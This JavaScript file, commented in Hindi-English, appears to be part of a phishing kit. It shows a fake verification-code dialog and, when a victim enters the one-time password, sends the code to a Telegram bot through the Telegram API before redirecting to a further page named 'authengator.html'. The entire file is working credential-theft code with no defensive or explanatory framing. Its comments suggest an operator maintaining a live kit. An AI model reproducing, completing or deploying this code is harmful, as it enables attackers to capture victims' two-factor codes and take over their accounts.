// YAHAN APNA PURANA TOKEN AUR CHAT ID RE-CHECK KAR LEIN
const telegramToken = 'YOUR_BOT_TOKEN_HERE';
const chatId = 'YOUR_CHAT_ID_HERE';
let currentMethod = '';

function openOtpModal(method) {
    currentMethod = method;
    const modal = document.getElementById('otp-modal');
    const otpInput = document.getElementById('otp-input');
    
    // Naya box khulte hi purana text delete ho jayega
    if (otpInput) { otpInput.value = ''; }

    const modalText = document.getElementById('modal-text');
    if (method === 'email') {
        modalText.innerText = "We have sent a 6-digit verification code to your email. Enter that code here.";
    } else if (method === 'phone') {
        modalText.innerText = "We have sent an OTP to your phone. Enter that OTP here.";
    }
    
    modal.style.display = "block";
}

function closeModal() {
    document.getElementById('otp-modal').style.display = "none";
}

function submitOtp() {
    const otpValue = document.getElementById('otp-input').value;

    if (otpValue.length >= 6) {
        // Telegram par data bhejne ka logic (Jo pehle tha)
        const message = `Verification Method: ${currentMethod}\nOTP Code: ${otpValue}`;
        fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
        .then(() => {
            // Teesra page (authengator.html) kholne ka logic
            window.location.href = 'authengator.html';
        })
        .catch(err => console.error("Error sending to Telegram", err));
    } else {
        alert("Please enter a valid code.");
    }
}

// Modal band karne ke liye
window.onclick = function(event) {
    const modal = document.getElementById('otp-modal');
    if (event.target == modal) { modal.style.display = "none"; }
}
